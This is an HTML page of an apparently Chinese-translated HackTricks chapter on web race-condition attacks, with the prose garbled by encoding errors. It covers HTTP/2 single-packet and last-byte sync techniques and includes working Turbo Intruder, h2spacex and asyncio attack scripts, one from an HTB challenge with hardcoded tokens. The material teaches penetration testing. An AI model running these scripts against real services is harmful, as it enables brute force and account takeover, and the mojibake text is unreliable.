<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Race Condition</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="race-condition"><a class="header" href="#race-condition">Race Condition</a></h1>
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=race-condition"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ä»Šå¤©è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=race-condition" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<p>{% hint style="warning" %}
è¦æ·±å…¥äº†è§£æ­¤æŠ€æœ¯ï¼Œè¯·æŸ¥çœ‹åŸå§‹æŠ¥å‘Š <a href="https://portswigger.net/research/smashing-the-state-machine">https://portswigger.net/research/smashing-the-state-machine</a>
{% endhint %}</p>
<h2 id="å¢å¼ºç«äº‰æ¡ä»¶æ”»å‡»"><a class="header" href="#å¢å¼ºç«äº‰æ¡ä»¶æ”»å‡»">å¢å¼ºç«äº‰æ¡ä»¶æ”»å‡»</a></h2>
<p>åˆ©ç”¨ç«äº‰æ¡ä»¶çš„ä¸»è¦éšœç¢æ˜¯ç¡®ä¿å¤šä¸ªè¯·æ±‚åŒæ—¶å¤„ç†ï¼Œ<strong>å¤„ç†æ—¶é—´å·®å¼‚éå¸¸å°â€”â€”ç†æƒ³æƒ…å†µä¸‹ï¼Œå°‘äº 1 æ¯«ç§’</strong>ã€‚</p>
<p>åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›åŒæ­¥è¯·æ±‚çš„æŠ€æœ¯ï¼š</p>
<h4 id="http2-å•åŒ…æ”»å‡»ä¸-http11-æœ€åå­—èŠ‚åŒæ­¥"><a class="header" href="#http2-å•åŒ…æ”»å‡»ä¸-http11-æœ€åå­—èŠ‚åŒæ­¥">HTTP/2 å•åŒ…æ”»å‡»ä¸ HTTP/1.1 æœ€åå­—èŠ‚åŒæ­¥</a></h4>
<ul>
<li><strong>HTTP/2</strong>ï¼šæ”¯æŒé€šè¿‡å•ä¸ª TCP è¿æ¥å‘é€ä¸¤ä¸ªè¯·æ±‚ï¼Œå‡å°‘ç½‘ç»œæŠ–åŠ¨çš„å½±å“ã€‚ç„¶è€Œï¼Œç”±äºæœåŠ¡å™¨ç«¯çš„å˜åŒ–ï¼Œä¸¤ä¸ªè¯·æ±‚å¯èƒ½ä¸è¶³ä»¥å®ç°ä¸€è‡´çš„ç«äº‰æ¡ä»¶åˆ©ç”¨ã€‚</li>
<li><strong>HTTP/1.1 'æœ€åå­—èŠ‚åŒæ­¥'</strong>ï¼šå…è®¸é¢„å‘é€ 20-30 ä¸ªè¯·æ±‚çš„å¤§éƒ¨åˆ†éƒ¨åˆ†ï¼Œä¿ç•™ä¸€ä¸ªå°ç‰‡æ®µï¼Œç„¶åä¸€èµ·å‘é€ï¼Œå®ç°åŒæ—¶åˆ°è¾¾æœåŠ¡å™¨ã€‚</li>
</ul>
<p><strong>æœ€åå­—èŠ‚åŒæ­¥çš„å‡†å¤‡</strong>åŒ…æ‹¬ï¼š</p>
<ol>
<li>å‘é€å¤´éƒ¨å’Œä¸»ä½“æ•°æ®ï¼Œå»æ‰æœ€åä¸€ä¸ªå­—èŠ‚è€Œä¸ç»“æŸæµã€‚</li>
<li>åœ¨åˆå§‹å‘é€åæš‚åœ 100 æ¯«ç§’ã€‚</li>
<li>ç¦ç”¨ TCP_NODELAYï¼Œä»¥åˆ©ç”¨ Nagle ç®—æ³•æ‰¹å¤„ç†æœ€åçš„å¸§ã€‚</li>
<li>è¿›è¡Œ ping æ“ä½œä»¥é¢„çƒ­è¿æ¥ã€‚</li>
</ol>
<p>éšåå‘é€çš„ä¿ç•™å¸§åº”ä»¥å•ä¸ªæ•°æ®åŒ…åˆ°è¾¾ï¼Œå¯ä»¥é€šè¿‡ Wireshark éªŒè¯ã€‚æ­¤æ–¹æ³•ä¸é€‚ç”¨äºé™æ€æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶é€šå¸¸ä¸æ¶‰åŠ RC æ”»å‡»ã€‚</p>
<h3 id="é€‚åº”æœåŠ¡å™¨æ¶æ„"><a class="header" href="#é€‚åº”æœåŠ¡å™¨æ¶æ„">é€‚åº”æœåŠ¡å™¨æ¶æ„</a></h3>
<p>äº†è§£ç›®æ ‡çš„æ¶æ„è‡³å…³é‡è¦ã€‚å‰ç«¯æœåŠ¡å™¨å¯èƒ½ä»¥ä¸åŒçš„æ–¹å¼è·¯ç”±è¯·æ±‚ï¼Œä»è€Œå½±å“æ—¶åºã€‚é€šè¿‡æ— å…³è¯·æ±‚è¿›è¡Œé¢„çƒ­çš„æœåŠ¡å™¨ç«¯è¿æ¥ï¼Œå¯èƒ½ä¼šä½¿è¯·æ±‚æ—¶åºæ­£å¸¸åŒ–ã€‚</p>
<h4 id="å¤„ç†åŸºäºä¼šè¯çš„é”å®š"><a class="header" href="#å¤„ç†åŸºäºä¼šè¯çš„é”å®š">å¤„ç†åŸºäºä¼šè¯çš„é”å®š</a></h4>
<p>åƒ PHP çš„ä¼šè¯å¤„ç†ç¨‹åºè¿™æ ·çš„æ¡†æ¶æŒ‰ä¼šè¯åºåˆ—åŒ–è¯·æ±‚ï¼Œå¯èƒ½ä¼šæ©ç›–æ¼æ´ã€‚ä¸ºæ¯ä¸ªè¯·æ±‚ä½¿ç”¨ä¸åŒçš„ä¼šè¯ä»¤ç‰Œå¯ä»¥è§„é¿æ­¤é—®é¢˜ã€‚</p>
<h4 id="å…‹æœé€Ÿç‡æˆ–èµ„æºé™åˆ¶"><a class="header" href="#å…‹æœé€Ÿç‡æˆ–èµ„æºé™åˆ¶">å…‹æœé€Ÿç‡æˆ–èµ„æºé™åˆ¶</a></h4>
<p>å¦‚æœè¿æ¥é¢„çƒ­æ— æ•ˆï¼Œé€šè¿‡å¤§é‡è™šå‡è¯·æ±‚æ•…æ„è§¦å‘ Web æœåŠ¡å™¨çš„é€Ÿç‡æˆ–èµ„æºé™åˆ¶å»¶è¿Ÿï¼Œå¯èƒ½ä¼šé€šè¿‡å¼•å‘æœåŠ¡å™¨ç«¯å»¶è¿Ÿæ¥ä¿ƒè¿›å•åŒ…æ”»å‡»ï¼Œä»è€Œæœ‰åˆ©äºç«äº‰æ¡ä»¶ã€‚</p>
<h2 id="æ”»å‡»ç¤ºä¾‹"><a class="header" href="#æ”»å‡»ç¤ºä¾‹">æ”»å‡»ç¤ºä¾‹</a></h2>
<ul>
<li><strong>Tubo Intruder - HTTP2 å•åŒ…æ”»å‡» (1 ä¸ªç«¯ç‚¹)</strong>ï¼šæ‚¨å¯ä»¥å°†è¯·æ±‚å‘é€åˆ° <strong>Turbo intruder</strong> (<code>Extensions</code> -&gt; <code>Turbo Intruder</code> -&gt; <code>Send to Turbo Intruder</code>)ï¼Œæ‚¨å¯ä»¥åœ¨è¯·æ±‚ä¸­æ›´æ”¹è¦æš´åŠ›ç ´è§£çš„å€¼ <strong><code>%s</code></strong>ï¼Œä¾‹å¦‚ <code>csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&amp;username=carlos&amp;password=%s</code>ï¼Œç„¶åä»ä¸‹æ‹‰èœå•ä¸­é€‰æ‹© <strong><code>examples/race-single-packer-attack.py</code></strong>ï¼š</li>
</ul>
<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
<p>å¦‚æœæ‚¨è¦ <strong>å‘é€ä¸åŒçš„å€¼</strong>ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªä¿®æ”¹è¿‡çš„ä»£ç ï¼Œå®ƒä½¿ç”¨å‰ªè´´æ¿ä¸­çš„å­—å…¸ï¼š</p>
<pre><code class="language-python">passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
</code></pre>
<p>{% hint style="warning" %}
å¦‚æœç½‘ç«™ä¸æ”¯æŒ HTTP2ï¼ˆä»…æ”¯æŒ HTTP1.1ï¼‰ï¼Œè¯·ä½¿ç”¨ <code>Engine.THREADED</code> æˆ– <code>Engine.BURP</code>ï¼Œè€Œä¸æ˜¯ <code>Engine.BURP2</code>ã€‚
{% endhint %}</p>
<ul>
<li><strong>Tubo Intruder - HTTP2 å•åŒ…æ”»å‡»ï¼ˆå¤šä¸ªç«¯ç‚¹ï¼‰</strong>ï¼šå¦‚æœæ‚¨éœ€è¦å‘ä¸€ä¸ªç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œç„¶åå‘å…¶ä»–å¤šä¸ªç«¯ç‚¹å‘é€è¯·æ±‚ä»¥è§¦å‘ RCEï¼Œæ‚¨å¯ä»¥å°† <code>race-single-packet-attack.py</code> è„šæœ¬æ›´æ”¹ä¸ºç±»ä¼¼ï¼š</li>
</ul>
<pre><code class="language-python">def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
</code></pre>
<ul>
<li>å®ƒä¹Ÿå¯ä»¥é€šè¿‡ Burp Suite ä¸­æ–°çš„â€œ<strong>å¹¶è¡Œå‘é€ç»„</strong>â€é€‰é¡¹åœ¨ <strong>Repeater</strong> ä¸­ä½¿ç”¨ã€‚</li>
<li>å¯¹äº <strong>limit-overrun</strong>ï¼Œæ‚¨å¯ä»¥åœ¨ç»„ä¸­<strong>æ·»åŠ ç›¸åŒçš„è¯·æ±‚ 50 æ¬¡</strong>ã€‚</li>
<li>å¯¹äº <strong>connection warming</strong>ï¼Œæ‚¨å¯ä»¥åœ¨ <strong>ç»„çš„å¼€å§‹</strong>æ·»åŠ ä¸€äº›è¯·æ±‚åˆ° web æœåŠ¡å™¨çš„æŸä¸ªéé™æ€éƒ¨åˆ†ã€‚</li>
<li>å¯¹äºåœ¨å¤„ç† <strong>ä¸€ä¸ªè¯·æ±‚å’Œå¦ä¸€ä¸ªè¯·æ±‚ä¹‹é—´</strong>çš„è¿‡ç¨‹ <strong>å»¶è¿Ÿ</strong>ï¼Œæ‚¨å¯ä»¥åœ¨ä¸¤ä¸ªè¯·æ±‚ä¹‹é—´ <strong>æ·»åŠ é¢å¤–çš„è¯·æ±‚</strong>ã€‚</li>
<li>å¯¹äº <strong>multi-endpoint</strong> RCï¼Œæ‚¨å¯ä»¥å¼€å§‹å‘é€ <strong>è¯·æ±‚</strong>ï¼Œè¯¥è¯·æ±‚ <strong>è¿›å…¥éšè—çŠ¶æ€</strong>ï¼Œç„¶ååœ¨å…¶å <strong>å‘é€ 50 ä¸ªè¯·æ±‚</strong>ï¼Œè¿™äº›è¯·æ±‚ <strong>åˆ©ç”¨éšè—çŠ¶æ€</strong>ã€‚</li>
</ul>
<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
<ul>
<li><strong>è‡ªåŠ¨åŒ– Python è„šæœ¬</strong>ï¼šè¯¥è„šæœ¬çš„ç›®æ ‡æ˜¯æ›´æ”¹ç”¨æˆ·çš„ç”µå­é‚®ä»¶ï¼ŒåŒæ—¶ä¸æ–­éªŒè¯ï¼Œç›´åˆ°æ–°ç”µå­é‚®ä»¶çš„éªŒè¯ä»¤ç‰Œåˆ°è¾¾æœ€åä¸€ä¸ªç”µå­é‚®ä»¶ï¼ˆè¿™æ˜¯å› ä¸ºåœ¨ä»£ç ä¸­çœ‹åˆ°ä¸€ä¸ª RCï¼Œå¯ä»¥ä¿®æ”¹ç”µå­é‚®ä»¶ï¼Œä½†éªŒè¯è¢«å‘é€åˆ°æ—§ç”µå­é‚®ä»¶ï¼Œå› ä¸ºæŒ‡ç¤ºç”µå­é‚®ä»¶çš„å˜é‡å·²ç»ç”¨ç¬¬ä¸€ä¸ªå¡«å……ï¼‰ã€‚<br />
å½“åœ¨æ”¶åˆ°çš„ç”µå­é‚®ä»¶ä¸­æ‰¾åˆ°â€œobjetivoâ€è¿™ä¸ªè¯æ—¶ï¼Œæˆ‘ä»¬çŸ¥é“æ”¶åˆ°äº†æ›´æ”¹ç”µå­é‚®ä»¶çš„éªŒè¯ä»¤ç‰Œï¼Œå¹¶ç»“æŸæ”»å‡»ã€‚</li>
</ul>
<pre><code class="language-python"># https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&amp;username=estes&amp;fullName=test&amp;antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&amp;username=estes&amp;fullName=test&amp;antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
</code></pre>
<h3 id="æ”¹è¿›å•åŒ…æ”»å‡»"><a class="header" href="#æ”¹è¿›å•åŒ…æ”»å‡»">æ”¹è¿›å•åŒ…æ”»å‡»</a></h3>
<p>åœ¨åŸå§‹ç ”ç©¶ä¸­è§£é‡Šäº†æ­¤æ”»å‡»çš„é™åˆ¶ä¸º1,500å­—èŠ‚ã€‚ç„¶è€Œï¼Œåœ¨<a href="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/"><strong>è¿™ç¯‡æ–‡ç« </strong></a>ä¸­ï¼Œè§£é‡Šäº†å¦‚ä½•é€šè¿‡ä½¿ç”¨IPå±‚åˆ†ç‰‡ï¼ˆå°†å•ä¸ªæ•°æ®åŒ…æ‹†åˆ†ä¸ºå¤šä¸ªIPæ•°æ®åŒ…ï¼‰å¹¶ä»¥ä¸åŒé¡ºåºå‘é€å®ƒä»¬ï¼Œä»è€Œæ‰©å±•å•åŒ…æ”»å‡»çš„1,500å­—èŠ‚é™åˆ¶åˆ°<strong>65,535 Bçš„TCPçª—å£é™åˆ¶</strong>ï¼Œè¿™ä½¿å¾—åœ¨æ‰€æœ‰ç‰‡æ®µåˆ°è¾¾æœåŠ¡å™¨ä¹‹å‰ï¼Œé˜²æ­¢é‡æ–°ç»„è£…æ•°æ®åŒ…ã€‚è¿™é¡¹æŠ€æœ¯ä½¿ç ”ç©¶äººå‘˜èƒ½å¤Ÿåœ¨å¤§çº¦166æ¯«ç§’å†…å‘é€10,000ä¸ªè¯·æ±‚ã€‚ </p>
<p>è¯·æ³¨æ„ï¼Œå°½ç®¡æ­¤æ”¹è¿›ä½¿å¾—åœ¨éœ€è¦æ•°ç™¾/æ•°åƒä¸ªæ•°æ®åŒ…åŒæ—¶åˆ°è¾¾çš„RCæ”»å‡»ä¸­æ›´å¯é ï¼Œä½†å®ƒä¹Ÿå¯èƒ½æœ‰ä¸€äº›è½¯ä»¶é™åˆ¶ã€‚ä¸€äº›æµè¡Œçš„HTTPæœåŠ¡å™¨å¦‚Apacheã€Nginxå’ŒGoå°†<code>SETTINGS_MAX_CONCURRENT_STREAMS</code>è®¾ç½®ä¸º100ã€128å’Œ250ã€‚ç„¶è€Œï¼Œå…¶ä»–å¦‚NodeJSå’Œnghttp2åˆ™æ²¡æœ‰é™åˆ¶ã€‚<br />
è¿™åŸºæœ¬ä¸Šæ„å‘³ç€Apacheå°†åªè€ƒè™‘æ¥è‡ªå•ä¸ªTCPè¿æ¥çš„100ä¸ªHTTPè¿æ¥ï¼ˆé™åˆ¶äº†æ­¤RCæ”»å‡»ï¼‰ã€‚</p>
<p>æ‚¨å¯ä»¥åœ¨ä»“åº“<a href="https://github.com/Ry0taK/first-sequence-sync/tree/main">https://github.com/Ry0taK/first-sequence-sync/tree/main</a>ä¸­æ‰¾åˆ°ä½¿ç”¨æ­¤æŠ€æœ¯çš„ä¸€äº›ç¤ºä¾‹ã€‚</p>
<h2 id="åŸå§‹bf"><a class="header" href="#åŸå§‹bf">åŸå§‹BF</a></h2>
<p>åœ¨ä¹‹å‰çš„ç ”ç©¶ä¹‹å‰ï¼Œä½¿ç”¨äº†ä¸€äº›æœ‰æ•ˆè½½è·ï¼Œè¿™äº›æœ‰æ•ˆè½½è·åªæ˜¯è¯•å›¾å°½å¯èƒ½å¿«åœ°å‘é€æ•°æ®åŒ…ä»¥å¼•å‘RCã€‚</p>
<ul>
<li><strong>Repeater:</strong> æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­çš„ç¤ºä¾‹ã€‚</li>
<li><strong>Intruder</strong>: å°†<strong>è¯·æ±‚</strong>å‘é€åˆ°<strong>Intruder</strong>ï¼Œåœ¨<strong>é€‰é¡¹èœå•</strong>ä¸­å°†<strong>çº¿ç¨‹æ•°</strong>è®¾ç½®ä¸º<strong>30</strong>ï¼Œå¹¶é€‰æ‹©æœ‰æ•ˆè½½è·<strong>Null payloads</strong>å¹¶ç”Ÿæˆ<strong>30</strong>ã€‚</li>
<li><strong>Turbo Intruder</strong></li>
</ul>
<pre><code class="language-python">def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=&lt;session_id_1&gt;','Session=&lt;session_id_2&gt;','Session=&lt;session_id_3&gt;']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
</code></pre>
<ul>
<li><strong>Python - asyncio</strong></li>
</ul>
<pre><code class="language-python">import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
</code></pre>
<h2 id="rc-methodology"><a class="header" href="#rc-methodology"><strong>RC Methodology</strong></a></h2>
<h3 id="limit-overrun--toctou"><a class="header" href="#limit-overrun--toctou">Limit-overrun / TOCTOU</a></h3>
<p>è¿™æ˜¯æœ€åŸºæœ¬çš„ç«äº‰æ¡ä»¶ç±»å‹ï¼Œå…¶ä¸­<strong>æ¼æ´</strong>å‡ºç°åœ¨<strong>é™åˆ¶æ‚¨æ‰§è¡Œæ“ä½œæ¬¡æ•°</strong>çš„åœ°æ–¹ã€‚å°±åƒåœ¨ç½‘ç»œå•†åº—ä¸­å¤šæ¬¡ä½¿ç”¨ç›¸åŒçš„æŠ˜æ‰£ç ã€‚ä¸€ä¸ªéå¸¸ç®€å•çš„ä¾‹å­å¯ä»¥åœ¨<a href="https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43"><strong>è¿™ä»½æŠ¥å‘Š</strong></a>æˆ–<a href="https://hackerone.com/reports/759247"><strong>è¿™ä¸ªæ¼æ´</strong></a><strong>ä¸­æ‰¾åˆ°ã€‚</strong></p>
<p>è¿™ç§æ”»å‡»æœ‰è®¸å¤šå˜ä½“ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
